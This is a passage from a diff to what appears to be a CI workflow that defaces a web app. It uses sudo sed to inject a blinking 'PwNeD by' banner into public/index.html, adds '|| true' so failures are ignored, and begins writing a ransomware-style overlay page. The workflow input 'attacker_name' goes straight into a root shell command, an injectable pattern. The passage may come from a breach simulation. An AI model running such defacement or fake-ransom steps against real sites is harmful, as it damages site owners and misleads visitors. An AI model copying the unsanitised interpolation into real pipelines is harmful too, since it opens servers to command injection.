@@ -57,11 +57,11 @@ jobs:
             cd $APP_DIR
             
             # 1a. Ensure a clean slate in case of previous failed injections
-            sudo chown ubuntu:ubuntu public/index.html
-            git checkout public/index.html
+            sudo chown ubuntu:ubuntu public/index.html || true
+            git checkout public/index.html || true
             
             # 1b. Injecting the banner directly into the HTML
-            sudo sed -i "s|<body>|<body><div id='hacked-banner' style='background: red; color: white; text-align: center; padding: 20px; font-size: 30px; font-family: monospace; font-weight: bold; position: fixed; top: 0; width: 100%; z-index: 9999; animation: blink 1s infinite;'>PwNeD by ${{ github.event.inputs.attacker_name }}</div><style>@keyframes blink { 50% { opacity: 0.5; } }</style>|g" public/index.html
+            sudo sed -i "s|<body>|<body><div id='hacked-banner' style='background: red; color: white; text-align: center; padding: 20px; font-size: 30px; font-family: monospace; font-weight: bold; position: fixed; top: 0; width: 100%; z-index: 9999; animation: blink 1s infinite;'>PwNeD by ${{ github.event.inputs.attacker_name }}</div><style>@keyframes blink { 50% { opacity: 0.5; } }</style>|g" public/index.html || true
             
             # 1c. Injecting the Ransomware UI overlay
             cat << 'RANSOM' > /tmp/ransom.html
